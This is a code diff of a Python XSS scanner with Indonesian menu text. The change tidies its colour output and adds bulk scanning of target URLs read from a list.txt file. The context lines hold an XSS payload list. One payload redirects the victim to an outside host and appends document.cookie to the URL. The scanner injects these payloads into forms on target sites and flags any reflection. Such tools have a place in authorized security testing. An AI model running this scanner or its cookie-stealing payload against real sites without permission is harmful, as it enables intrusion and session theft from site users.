@@ -3,12 +3,11 @@ import requests
 from pprint import pprint
 from bs4 import BeautifulSoup as bs
 from urllib.parse import urljoin
-from colorama import Fore, Back, Style
-
+from colorama import Fore, Style
 
 print(
-        Fore.BLUE +
-         """
+    Fore.BLUE +
+    """
 ⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
 ⠀⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀⠀
@@ -34,12 +33,12 @@ print(
 ⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣤⡀⠀⠀⠀⠀⠀⠈⣳⠀⣿⠛⠻⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡯⠀⠀⠀⠀⠀
-
-                                                       
+                         
         """ + Fore.RESET)
 
 print()
 print()
+
 # Daftar payload XSS yang lebih beragam
 XSS_PAYLOADS = [
     "<script>alert('hi')</script>",
@@ -58,7 +57,6 @@ XSS_PAYLOADS = [
     "<script>document.location='https://google.com/?cookie=' + document.cookie</script>",
     "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
     "<w contenteditable id=x onfocus=alert()>",
-    
 ]
 
 class MissingUrlException(Exception):
@@ -118,9 +116,8 @@ class BaseXSSScanner:
                 response = self._submit_form(form_details, url, payload)
                 print(f"[*] Testing form: {form_details}")
                 print(f"[*] Using payload: {payload}")
-                print(response.content.decode())  # Menampilkan konten respons
                 if payload in response.content.decode():
-                    print(f"\033[91m[+] XSS Detected on {url}\033[0m")
+                    print(f"{Fore.RED}[+] XSS Detected on {url}{Style.RESET_ALL}")
                     print(f"[*] Form details:")
                     pprint(form_details)
 
@@ -146,9 +143,10 @@ class XSSGameScanner(BaseXSSScanner):
         return details
 
 def main():
-    print(f"\033[91m [*] XSS Scanner Menu:\033[0m")
+    print(f"{Fore.RED}[*] XSS Scanner Menu:{Style.RESET_ALL}")
     print("1. Scan URL")
-    print("2. Keluar")
+    print("2. Scan dari file list.txt")
+    print("3. Keluar")
 
     pilihan = input("Pilih menu: ")
 
@@ -157,6 +155,17 @@ def main():
         scanner = XSSGameScanner(url)
         scanner.scan(url)
     elif pilihan == "2":
+        try:
+            with open('list.txt', 'r') as file:
+                urls = file.readlines()
+                for url in urls:
+                    url = url.strip()  # Menghapus spasi di awal dan akhir
+                    print(f"\n{Fore.BLUE}[*] Scanning {url}...{Style.RESET_ALL}")
+                    scanner = XSSGameScanner(url)
+                    scanner.scan(url)
+        except FileNotFoundError:
+            print(f"{Fore.RED}[!] File list.txt tidak ditemukan!{Style.RESET_ALL}")
+    elif pilihan == "3":
         print("Keluar dari scanner.")
     else:
         print("Pilihan tidak valid. Silakan coba lagi.")
